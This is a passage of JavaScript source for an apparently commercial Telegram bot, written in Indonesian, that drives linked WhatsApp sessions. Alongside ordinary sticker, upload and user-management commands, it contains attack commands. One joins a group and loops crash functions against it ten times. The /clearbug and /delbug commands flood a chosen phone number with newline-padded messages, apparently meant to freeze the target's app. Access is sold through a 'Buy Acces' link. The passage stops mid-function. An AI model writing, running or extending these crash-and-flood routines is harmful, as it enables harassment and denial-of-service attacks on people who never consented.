    async function joinAndSendBug(groupLink) {
      try {
        const groupCode = extractGroupID(groupLink);
        if (!groupCode) {
          await bot.sendMessage(chatId, "Link grup tidak valid");
          return false;
        }

        try {
          const groupId = await sock.groupGetInviteInfo(groupCode);

          for (let i = 0; i < 10; i++) {
            await groupUiCrash(target);
            await GroupFC(sock, target);
          }
        } catch (error) {
          console.error(`Error dengan bot`, error);
        }
        return true;
      } catch (error) {
        console.error("Error dalam joinAndSendBug:", error);
        return false;
      }
    }

    const success = await joinAndSendBug(groupLink);

    if (success) {
      await bot.sendPhoto(chatId, "https://files.catbox.moe/hcqdcj.jpg", {
        caption: `
✅ Succes Sent Bugs Group! 

- status : Success
- Link : ${groupLink}
`,
        parse_mode: "Markdown",
      });
    } else {
      await bot.sendMessage(chatId, "Gagal Mengirim Bug");
    }
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});


bot.onText(/^\/brat(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const argsRaw = match[1];
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }
  
  if (!argsRaw) {
    return bot.sendMessage(chatId, 'Gunakan: /brat <teks> [--gif] [--delay=500]');
  }

  try {
    const args = argsRaw.split(' ');

    const textParts = [];
    let isAnimated = false;
    let delay = 500;

    for (let arg of args) {
      if (arg === '--gif') isAnimated = true;
      else if (arg.startsWith('--delay=')) {
        const val = parseInt(arg.split('=')[1]);
        if (!isNaN(val)) delay = val;
      } else {
        textParts.push(arg);
      }
    }

    const text = textParts.join(' ');
    if (!text) {
      return bot.sendMessage(chatId, 'Teks tidak boleh kosong!');
    }

    // Validasi delay
    if (isAnimated && (delay < 100 || delay > 1500)) {
      return bot.sendMessage(chatId, 'Delay harus antara 100–1500 ms.');
    }

    await bot.sendMessage(chatId, '🌿 Generating stiker brat...');

    const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;
    const response = await axios.get(apiUrl, {
      responseType: 'arraybuffer',
    });

    const buffer = Buffer.from(response.data);

    // Kirim sticker (bot API auto-detects WebP/GIF)
    await bot.sendSticker(chatId, buffer);
  } catch (error) {
    console.error('❌ Error brat:', error.message);
    bot.sendMessage(chatId, 'Gagal membuat stiker brat. Coba lagi nanti ya!');
  }
});
bot.onText(/\/tourl/i, async (msg) => {
    const chatId = msg.chat.id;
    
    
    if (!msg.reply_to_message || (!msg.reply_to_message.document && !msg.reply_to_message.photo && !msg.reply_to_message.video)) {
        return bot.sendMessage(chatId, "❌ Silakan reply sebuah file/foto/video dengan command /tourl");
    }

    const repliedMsg = msg.reply_to_message;
    let fileId, fileName;

    
    if (repliedMsg.document) {
        fileId = repliedMsg.document.file_id;
        fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
    } else if (repliedMsg.photo) {
        fileId = repliedMsg.photo[repliedMsg.photo.length - 1].file_id;
        fileName = `photo_${Date.now()}.jpg`;
    } else if (repliedMsg.video) {
        fileId = repliedMsg.video.file_id;
        fileName = `video_${Date.now()}.mp4`;
    }

    try {
        
        const processingMsg = await bot.sendMessage(chatId, "⏳ Mengupload ke Catbox...");

        
        const fileLink = await bot.getFileLink(fileId);
        const response = await axios.get(fileLink, { responseType: 'stream' });

        
        const form = new FormData();
        form.append('reqtype', 'fileupload');
        form.append('fileToUpload', response.data, {
            filename: fileName,
            contentType: response.headers['content-type']
        });

        const { data: catboxUrl } = await axios.post('https://catbox.moe/user/api.php', form, {
            headers: form.getHeaders()
        });

        
        await bot.editMessageText(` Upload berhasil!\n📎 URL: ${catboxUrl}`, {
            chat_id: chatId,
            message_id: processingMsg.message_id
        });

    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, "❌ Gagal mengupload file ke Catbox");
    }
});

bot.onText(/^\/clearbug\s+(.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const q = match[1]; // Ambil argumen setelah /delete-bug
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

    if (!q) {
        return bot.sendMessage(chatId, `Cara Pakai Nih Njing!!!\n/clearbug 62xxx`);
    }
    
    let pepec = q.replace(/[^0-9]/g, "");
    if (pepec.startsWith('0')) {
        return bot.sendMessage(chatId, `Contoh : /clarebug 62xxx`);
    }
    
    let target = pepec + '@s.whatsapp.net';
    
    try {
        for (let i = 0; i < 3; i++) {
            await sock.sendMessage(target, { 
                text: "ꋪꋬ꒐꒯ꏂꉧ ꉔ꒒ꏂꋬꋪ ꃳ꒤ꍌ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝐑𝐀𝐈𝐃𝐄𝐗 𝐋𝐈𝐆𝐇𝐓"
            });
        }
        bot.sendMessage(chatId, `Succes Sending /clearbug For ${target}`);
    } catch (err) {
        console.error("Error:", err);
        bot.sendMessage(chatId, "Ada kesalahan saat mengirim bug.");
    }
});

bot.onText(/^\/delbug\s+(.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const q = match[1]; // Ambil argumen setelah /delete-bug
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ Kamu Bukan Premium."
    );
  }

    if (!q) {
        return bot.sendMessage(chatId, `Cara Pakai Nih Njing!!!\n/delbug 62xxx`);
    }
    
    let pepec = q.replace(/[^0-9]/g, "");
    if (pepec.startsWith('0')) {
        return bot.sendMessage(chatId, `Contoh : /delbug 62xxx`);
    }
    
    let target = pepec + '@s.whatsapp.net';
    
    try {
        for (let i = 0; i < 3; i++) {
            await sock.sendMessage(target, { 
                text: "𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆 \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝐑𝐀𝐈𝐃𝐄𝐗 𝐋𝐈𝐆𝐇𝐓"
            });
        }
        bot.sendMessage(chatId, `Succes Sending /delbug For ${target}`);
    } catch (err) {
        console.error("Error:", err);
        bot.sendMessage(chatId, "Ada kesalahan saat mengirim bug.");
    }
});

//=======case owner=======//
bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [
                {
                   text: "Buy Acces", 
                   url: "https://t.me/VorzaOffc"
                }
              ]
            ]
          }
        }
      );
    }

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 123456789.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ Succes Id ${userId} Di tambahkan ke admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [
                {
                   text: "Buy Acces", 
                   url: "https://t.me/VorzaOffc"
                }
              ]
            ]
          }
        }
      );
    }

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 123456789.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});


bot.onText(/\/addowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "Buy Acces", 
                  url: "https://t.me/VorzaOffc"
                }
              ]
            ]
          }
        }
      );
    }

  const newOwnerId = match[1].trim();

  try {
    const configPath = "./settings/config.js";
    const configContent = fs.readFileSync(configPath, "utf8");

    if (config.OWNER_ID.includes(newOwnerId)) {
      return bot.sendMessage(
        chatId,
        `\`\`\`
╭─────────────────
│    GAGAL MENAMBAHKAN    
│────────────────
│ User ${newOwnerId} sudah
│ terdaftar sebagai owner
╰─────────────────\`\`\``,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID.push(newOwnerId);

    const newContent = `module.exports = {
  BOT_TOKEN: "${config.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
};`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `\`\`\`
╭─────────────────
│    BERHASIL MENAMBAHKAN    
│────────────────
│ ID: ${newOwnerId}
│ Status: Owner Bot
╰─────────────────\`\`\``,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error adding owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menambahkan owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/delowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const ownerIdToRemove = match[1].trim();

  try {
    const configPath = "./settings/config.js";

    if (!config.OWNER_ID.includes(ownerIdToRemove)) {
      return bot.sendMessage(
        chatId,
        `\`\`\`
╭─────────────────
│    GAGAL MENGHAPUS    
│────────────────
│ User ${ownerIdToRemove} tidak
│ terdaftar sebagai owner
╰─────────────────\`\`\``,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID = config.OWNER_ID.filter((id) => id !== ownerIdToRemove);

    const newContent = `module.exports = {
  BOT_TOKEN: "${config.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
};`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `\`\`\`
╭─────────────────
│    BERHASIL MENGHAPUS    
│────────────────
│ ID: ${ownerIdToRemove}
│ Status: User Biasa
╰─────────────────\`\`\``,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error removing owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menghapus owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/listbot/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    let botList = 
  "```" + "\n" +
  "╭━━━⭓「 𝐋𝐢𝐒𝐓 ☇ °𝐁𝐎𝐓 」\n" +
  "║\n" +
  "┃\n";

let index = 1;

for (const [botNumber, sock] of sessions.entries()) {
  const status = sock.user ? "🟢" : "🔴";
  botList += `║ ◇ 𝐁𝐎𝐓 ${index} : ${botNumber}\n`;
  botList += `┃ ◇ 𝐒𝐓𝐀𝐓𝐔𝐒 : ${status}\n`;
  botList += "║\n";
  index++;
}
botList += `┃ ◇ 𝐓𝐎𝐓𝐀𝐋𝐒 : ${sessions.size}\n`;
botList += "╰━━━━━━━━━━━━━━━━━━⭓\n";
botList += "```";


    await bot.sendMessage(chatId, botList, { parse_mode: "Markdown" });
  } catch (error) {
    console.error("Error in listbot:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengambil daftar bot. Silakan coba lagi."
    );
  }
});

bot.onText(/\/addbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error(`bot ${botNum}:`, error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

const moment = require("moment");

bot.onText(/\/setcd (\d+[smh])/, (msg, match) => {
  const chatId = msg.chat.id;
  const response = setCooldown(match[1]);

  bot.sendMessage(chatId, response);
});

bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d."
    );
  }

  const args = match[1].split(" ");
  if (args.length < 2) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d."
    );
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ""));
  const duration = args[1];

  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d."
    );
  }

  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d."
    );
  }

  const now = moment();
  const expirationDate = moment().add(
    parseInt(duration),
    duration.slice(-1) === "d"
      ? "days"
      : duration.slice(-1) === "h"
      ? "hours"
      : "minutes"
  );

  if (!premiumUsers.find((user) => user.id === userId)) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(
      `${senderId} added ${userId} to premium until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}`
    );
    bot.sendMessage(
      chatId,
      `✅ User ${userId} has been added to the premium list until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  } else {
    const existingUser = premiumUsers.find((user) => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
    savePremiumUsers();
    bot.sendMessage(
      chatId,
      `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem 6843967527");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});


bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```L I S T - P R E M \n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format("YYYY-MM-DD HH:mm:ss");
    message += `${index + 1}. ID: \`${
      user.id
    }\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

bot.onText(/\/cekidch (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const link = match[1];

  let result = await getWhatsAppChannelInfo(link);

  if (result.error) {
    bot.sendMessage(chatId, `⚠️ ${result.error}`);
  } else {
    let teks = `
📢 *Informasi Channel WhatsApp*
🔹 *ID:* *${result.id}*
🔹 *Nama:* *${result.name}*
🔹 *Total Pengikut:* *${result.subscribers}*
🔹 *Status:* *${result.status}*
🔹 *Verified:* *${result.verified}*
        `;
    bot.sendMessage(chatId, teks, { 
    parse_mode: "Markdown", 
      reply_markup: {
        inline_keyboard: [
          [
            { 
              text: "〣 SALIN ID CHANNEL 〣", 
              copy_text: { text: String(result.id) }
            }
          ]
        ]
      }
    });
  }
});

bot.onText(/\/delbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  let statusMessage = await bot.sendMessage(
    chatId,
`
⌛ Proses Hapus Nomor

#- Information Nomor
• Nomor : \`${botNumber}\`
• Status : *♻️ Proses Hapus*
`,
    { parse_mode: "Markdown" }
  );

  try {
    const sock = sessions.get(botNumber);
    if (sock) {
      sock.logout();
      sessions.delete(botNumber);

      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }

      if (fs.existsSync(SESSIONS_FILE)) {
        const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        const updatedNumbers = activeNumbers.filter((num) => num !== botNumber);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
      }

      await bot.editMessageText(`
*✅ Succes*

*#- Information Nomor*
• Nomor : \`${botNumber}\`
• Status : *✅ Berhasil Di Hapus*
`,
        {
          chat_id: chatId,
          message_id: statusMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    } else {
      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });

        if (fs.existsSync(SESSIONS_FILE)) {
          const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
          const updatedNumbers = activeNumbers.filter(
            (num) => num !== botNumber
          );
          fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
        }

        await bot.editMessageText(`
✅ Succes

#- Information Nomor
• Nomor : \`${botNumber}\`
• Status : *✅ Berhasil Di Hapus*
`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      } else {
        await bot.editMessageText(`
🚫 Nomor Tidak di temukan

#- Information Nomor
• Nomor : \`${botNumber}\`
• Status : *❌ Nomor Tidak di temukan*
`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      }
    }
  } catch (error) {
    console.error("Error deleting bot:", error);
    await bot.editMessageText(`
🚫 Error 

#- Information Nomor
• Nomor : \`${botNumber}\`
• Status : *❌ Error*
• Error : *${error.message}*
`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/^\/iqc (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) {
    return bot.sendMessage(
      chatId,
      "⚠ Gunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return bot.sendMessage(
      chatId,
      "⚠ Format salah!\nGunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  bot.sendMessage(chatId, "⏳ Tunggu sebentar lagi di buat...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return bot.sendMessage(chatId, "❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await bot.sendPhoto(chatId, buffer, {
      caption: `✅ IQC Generator\n\n ✍️Teks :\n*${text}*`,
      parse_mode: "Markdown",
    });
  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menghubungi API.");
  }
});

// Verifikasi Token
let verified = false;

bot.on("callback_query", async (q) => {
  if (q.data !== "verif_token") return;
  
  const chatId = q.message.chat.id;
  const messageId = q.message.message_id;

  await bot.deleteMessage(chatId, messageId);

  if (!isOwner(q.from.id)) {
     return bot.answerCallbackQuery(q.id, {
        text: "❌ Kamu Bukan Owner",
        show_alert: true
     });
  }

  const loading = await bot.sendMessage(
    chatId,
    "⏳ Sedang memverifikasi token..."
  );
  
  bot.answerCallbackQuery(q.id, {
    text: "⌛ Proses Verifikasi Token.....", 
  });

  try {
    const { data } = await axios.get(GITHUB_TOKEN_LIST_URL);

    const tokenList = Array.isArray(data.tokens) ? data.tokens : [];

    const valid = tokenList.includes(BOT_TOKEN);

    if (valid) {
      verified = true;
      await bot.editMessageText(
        "✅ <b>Token telah terverifikasi</b>\nToken Kamu terdaftar silahkan ketik ulang /start",
        {
          chat_id: chatId,
          message_id: loading.message_id,
          parse_mode: "HTML",
        }
      );
    } else {
      await bot.editMessageText(
        "❌ <b>Token Tidak Valid!</b>\nToken kamu tidak terdaftar.",
        {
          chat_id: chatId,
          message_id: loading.message_id,
          parse_mode: "HTML",
        }
      );
     process.exit(1);
    }
  } catch (err) {
    await bot.editMessageText(
      "⚠️ Gagal mengambil data token dari GitHub.",
      {
        chat_id: chatId,
        message_id: loading.message_id,
        parse_mode: "HTML",
      }
    );
    console.error(err);
  }
});

bot.onText(/\/fixcode/, async (msg) => {
  const chatId = msg.chat.id;
  const replyMsg = msg.reply_to_message;

  try {
    // Cek apakah user reply ke file .js
    if (!replyMsg || !replyMsg.document) {
      return bot.sendMessage(chatId, "📂 Kirim file .js dan *reply* dengan perintah /fixcode", {
        parse_mode: "Markdown",
      });
    }

    const file = replyMsg.document;
    if (!file.file_name.endsWith(".js")) {
      return bot.sendMessage(chatId, "⚠️ File harus berformat .js");
    }

    // Ambil file link
    const fileLink = await bot.getFileLink(file.file_id);
    await bot.sendMessage(chatId, "🤖 Wait sedang memperbaiki code nya ya broww.. tunggu sebentar");

    // Download isi file
    const response = await axios.get(fileLink, { responseType: "arraybuffer" });
    const fileContent = Buffer.from(response.data).toString("utf-8");

    // Kirim ke API NekoLabs
    const { data } = await axios.get("https://api.nekolabs.web.id/ai/gpt/4.1", {
      params: {
        text: fileContent,
        systemPrompt: `Kamu adalah seorang programmer ahli JavaScript dan Node.js.
Tugasmu adalah memperbaiki kode yang diberikan agar bisa dijalankan tanpa error, 
namun jangan mengubah struktur, logika, urutan, atau gaya penulisan aslinya.

Fokus pada:
- Menyelesaikan error sintaks (kurung, kurawal, tanda kutip, koma, dll)
- Menjaga fungsi dan struktur kode tetap sama seperti input
- Jangan menghapus komentar, console.log, atau variabel apapun
- Jika ada blok terbuka (seperti if, else, try, atau fungsi), tutup dengan benar
- Jangan ubah nama fungsi, variabel, atau struktur perintah
- Jangan tambahkan penjelasan apapun di luar kode
- Jangan tambahkan markdown javascript Karena file sudah berbentuk file .js
- Hasil akhir harus langsung berupa kode yang siap dijalankan
`,
        sessionId: "neko"
      },
      timeout: 60000,
    });

    if (!data.success || !data.result) {
      return bot.sendMessage(chatId, "❌ Gagal memperbaiki kode");
    }

    const fixedCode = data.result;
    const outputPath = `./fixed_${file.file_name}`;
    fs.writeFileSync(outputPath, fixedCode);

    await bot.sendDocument(chatId, outputPath, {}, {
      filename: `fixed_${file.file_name}`,
      contentType: "text/javascript",
    });
  } catch (err) {
    console.error("FixCode Error:", err);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan waktu memperbaiki kode");
  }
});

bot.onText(/\/getcode (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const randomImage = getRandomImage();
    const userId = msg.from.id;
            //cek prem //
if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, "raidex.png", {
    caption: `
<blockquote><b>🚫 Akses Di tolak</b></blockquote>
<u>Fitur ini hanya khusus premium</u>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Buy Acces", url: "https://t.me/VorzaOffc" }]
      ]
    }
  });
}
  const url = (match[1] || "").trim();
  if (!/^https?:\/\//i.test(url)) {
    return bot.sendMessage(chatId, "🚫 Format salah!!\n/getcode https://namaweb");
  }

  try {
    const response = await axios.get(url, {
